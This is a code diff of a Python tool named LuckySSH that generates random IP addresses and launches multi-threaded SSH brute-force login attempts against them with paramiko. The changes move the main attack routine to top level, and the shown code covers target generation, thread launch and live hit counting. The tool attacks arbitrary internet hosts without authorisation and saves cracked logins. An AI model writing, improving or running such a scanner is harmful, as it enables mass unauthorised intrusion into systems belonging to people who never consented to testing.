@@ -17,6 +17,7 @@
 
 import random, paramiko, threading, os, sys, time, socket
 from random import randint
+from time import sleep
 import colorama
 from colorama import *
 init()
@@ -119,10 +120,10 @@ def ipgen(bodycount):
             r2 = int(randint(0, 255))
             r3 = int(randint(0, 255))
             r4 = int(randint(1, 255))
-            randomip = (
+            randomip = (str(
                     # combine the 4 random numbers to an IP:
                     str(r1) + '.' + str(r2) + '.' + str(r3) + '.' + str(r4)
-            )
+            ))
             # write random IP to file:
             ipwriter(str(randomip))
             X -= 1
@@ -133,11 +134,11 @@ def ipgen(bodycount):
 
 # countdown() ...yes, it counts down starting with "5":
 def countdown():
-    i = int(5)
-    while i > 0:
-        print(Fore.LIGHTYELLOW_EX + '... ' + str(i))
+    z = int(5)
+    while z > 0:
+        print(Fore.LIGHTYELLOW_EX + '... ' + str(z))
         sleep(0.9)
-        i -= 1
+        z -= 1
     return None
 
 # invader() is the SSH-client the bruter() will use:
@@ -193,45 +194,6 @@ def bruter():
             continue
     return None
 
-# main() ... the attacker:
-def main():
-    try:
-        # clean screen and print logo, then:
-        clean()
-        print(Fore.LIGHTRED_EX + Style.BRIGHT + logo)
-        # get lucky number for user, tell about and generate random IPs:
-        lucky_number = int(luckynumber())
-        print(Fore.WHITE + '\nYour lucky number is: ' + Fore.LIGHTGREEN_EX + str(lucky_number) + ' ...\n')
-        generator_status = ipgen(int(lucky_number))
-        if generator_status == False:
-            clean()
-            sys.exit(Fore.LIGHTRED_EX + '\n\n(!) AN ERROR OCCURRED (!) when generating IPs ... sorry, bye!\n\n')
-        else:
-            # start the attack:
-            print(Fore.LIGHTGREEN_EX + 'Starting attack in ...\n')
-            countdown()
-            clean()
-            # fetch random IPs into targetlist:
-            targetips = open('targets.txt', 'r').read().splitlines()
-            # start bruter() multi-threaded:
-            for _ in range(attack_threads):
-                threading.Thread(target=bruter).start()
-            # show stats in window title while bruteforce attack is ongoing:
-            while len(targetips) > 0:
-                try:
-                    sleep(0.1)
-                    wintitle = str(
-                        'TO CHECK: ' + str(len(targetips)) + ' | HITS: ' + str(checks_hit) + ' | BAD: '
-                        + str(checks_bad)
-                    )
-                    sys.stdout.write('\33]0;' + str(wintitle) + '\a')
-                    sys.stdout.flush()
-                except: pass
-    except:
-        # on errors, clean screen and close LuckySSH:
-        clean()
-        sys.exit(Fore.LIGHTRED_EX + '\n\n(!) AN ERROR OCCURRED (!) ... LuckySSH has been terminated!\n\n')
-
 # <<---------------------------------------------------------------------------------------------------------------->>
 
 '''
@@ -239,18 +201,34 @@ def main():
 |   << (!) STARTUP (!) >>   |
 +---------------------------+
 '''
-try:
-    main()
+
+# clean screen and print logo, then:
+clean()
+print(Fore.LIGHTRED_EX + Style.BRIGHT + logo)
+# get lucky number for user, tell about and generate random IPs:
+lucky_number = int(luckynumber())
+print(Fore.WHITE + '\nYour lucky number is: ' + Fore.LIGHTGREEN_EX + str(lucky_number) + ' ...\n')
+generator_status = ipgen(int(lucky_number))
+if generator_status == False:
     clean()
-    if checks_hit > 0:
-        sys.exit(Fore.LIGHTGREEN_EX + '\n\nYou lucky guy! Your hits have been saved to "hits.txt" ... bye!\n\n')
-    else:
-        sys.exit(Fore.LIGHTRED_EX + '\n\nBad luck! No hits for you this time ... bye!\n\n')
-except KeyboardInterrupt:
+    sys.exit(Fore.LIGHTRED_EX + '\n\n(!) AN ERROR OCCURRED (!) when generating IPs ... sorry, bye!\n\n')
+else:
+    # start the attack:
+    print(Fore.LIGHTGREEN_EX + 'Starting attack in ...\n')
+    countdown()
     clean()
-    sys.exit(
-        Fore.LIGHTRED_EX + '\n\n(!) SUDDEN DEATH (!) to your attack ...\n\n\n' + Fore.WHITE + 'Your results: '
-        + Fore.LIGHTGREEN_EX + 'HITS = ' + str(checks_hit) + Fore.WHITE + ', ' + Fore.LIGHTRED_EX + 'BAD = '
-        + str(checks_bad) + Fore.WHITE + ', ' + Fore.LIGHTYELLOW_EX + 'LEFT = ' + str(len(targetips))
-    )
+    # fetch random IPs into targetlist:
+    targetips = open('targets.txt', 'r').read().splitlines()
+    # start bruter() multi-threaded:
+    for _ in range(attack_threads):
+        threading.Thread(target=bruter).start()
+    # show stats in window title while bruteforce attack is ongoing:
+    while len(targetips) > 0:
+        try:
+            sleep(0.1)
+            wintitle = str('TO CHECK: ' + str(len(targetips)) + ' | HITS: ' + str(checks_hit) + ' | BAD: ' + str(checks_bad))
+            sys.stdout.write('\33]0;' + str(wintitle) + '\a')
+            sys.stdout.flush()
+        except: pass
+
 # DrPython3 (C) 2020
